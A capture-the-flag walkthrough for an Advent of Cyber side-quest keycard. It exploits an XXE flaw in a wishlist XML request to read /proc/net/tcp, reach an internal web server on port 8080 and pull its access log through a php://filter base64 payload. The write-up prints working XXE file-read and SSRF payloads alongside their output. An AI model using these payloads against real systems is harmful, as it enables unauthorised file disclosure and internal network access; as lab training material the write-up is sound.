# Advent of Cyber Side Quest - L2 Keycard

Keycard Location: Day 5
Target IP: 10.10.207.217

Considering the hint that was given it suggests that there are open ports, however, just from running an nmap scan of the target system, we cannot see anything, this is assumed since also in the hint we are told the system was hardened. 

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

We can see that there is nothing visible that we can access from the outside. However, if we remember the task from the room, we are able to understand that we have insider access to the target system through the XXE (XML External Entity) vulnerability. 

Whilst there may not be any public facing ports that are open, we are able to search the target system from the inside for any local ports that are open. 

To do so we will capture the POST request in Burpsuite just like the task originally asked us to:

![[Pasted image 20250101011957.png]]

Now, we need to find a file that shows the local IP addresses/ports that are available. Searching Google we find that we can look at the file: `/proc/net/tcp`

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/proc/net/tcp"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

From this we receive the following output:

```
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 0100007F:8F7B 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25845 1 0000000000000000 100 0 0 10 0                     
   1: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24855 1 0000000000000000 100 0 0 10 0                     
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 26345 1 0000000000000000 100 0 0 10 0                     
   3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 26368 1 0000000000000000 100 0 0 10 0                     
   4: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 19946 1 0000000000000000 100 0 0 10 0                     
   5: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 26365 1 0000000000000000 100 0 0 10 0                     
   6: D9CF0A0A:8C0E DC411FAC:01BB 01 00000000:00000000 02:000001EE 00000000     0        0 29146 2 0000000000000000 20 4 30 10 -1   
```

Using the following python script made by [Reboare](https://gist.github.com/Reboare/2e0122b993b8557935fd37b27436f8c2) and modifying it slightly to use a file with the above output in it, we receive a human readable file:

```
# -*- coding: utf-8 -*-
import re
import sys


def process_file(procnet):
    sockets = procnet.split('\n')[1:-1]
    return [line.strip() for line in sockets]

def split_every_n(data, n):
    return [data[i:i+n] for i in range(0, len(data), n)]

def convert_linux_netaddr(address):

    hex_addr, hex_port = address.split(':')

    addr_list = split_every_n(hex_addr, 2)
    addr_list.reverse()

    addr = ".".join(map(lambda x: str(int(x, 16)), addr_list))
    port = str(int(hex_port, 16))

    return "{}:{}".format(addr, port)

def format_line(data):
    return (("%(seq)-4s %(uid)5s %(local)25s %(remote)25s %(timeout)8s %(inode)8s" % data) + "\n")

with open('file') as f:
    sockets = process_file(f.read())

columns = ("seq", "uid", "inode", "local", "remote", "timeout")
title = dict()
for c in columns:
    title[c] = c

rv = []
for info in sockets:
    _ = re.split(r'\s+', info)

    _tmp = {
        'seq': _[0],
        'local': convert_linux_netaddr(_[1]),
        'remote': convert_linux_netaddr(_[2]),
        'uid': _[7],
        'timeout': _[8],
        'inode': _[9],
    }
    rv.append(_tmp)

if len(rv) > 0:
    sys.stderr.write(format_line(title))

    for _ in rv:
        sys.stdout.write(format_line(_))

```

```
seq    uid                     local                    remote  timeout    inode
0:       0           127.0.0.1:36731                 0.0.0.0:0        0    25845
1:       0            127.0.0.1:8080                 0.0.0.0:0        0    24855
2:       0                0.0.0.0:22                 0.0.0.0:0        0    26345
3:     113            127.0.0.1:3306                 0.0.0.0:0        0    26368
4:     101             127.0.0.53:53                 0.0.0.0:0        0    19946
5:     113           127.0.0.1:33060                 0.0.0.0:0        0    26365
6:       0       10.10.207.217:35854         172.31.65.220:443        0    29146
```

Here we see some interesting connections that were not hardened, we are specifically interested in the localhost under port 8080 which is typically used to host a local web server.

What we can do now is place this link in the XML in Burpsuite like the following:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "http://localhost:8080/"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

From this we receive the following message:

![[Pasted image 20250102161816.png]]

This may mean that there are some characters in the XML that the system cannot understand, to ensure that we make it in a format that the system understands, we will encode it using base64 using the php application:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:8080/"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

From this we receive the following base64 response:

![[Pasted image 20250102162912.png]]

Now sending the response to decoder we receive the following:

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /</title>
 </head>
 <body>
<h1>Index of /</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="access.log">access.log</a></td><td align="right">2024-12-03 12:53  </td><td align="right">223 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at localhost Port 8080</address>
</body></html>
```

Here we don't see too much however we do see a link for access.log. 
Now adding this file to the end of the XML we will send, we receive an interesting response.

Request:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:8080/access.log"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

Response:

![[Pasted image 20250102163604.png]]

Decoded:

```
10.13.27.113 - - [18/Nov/2024:14:43:35 +0000] "GET /k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png HTTP/1.1" 200 194 "http://10.10.218.19/product.php?id=1" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

Here we receive a HTTP GET request for an interesting PNG at a specific directory and file, by heading to this file on our Wareville application we see the keycard:

![[Pasted image 20250102163830.png]]

Now we can disable the firewall using the password.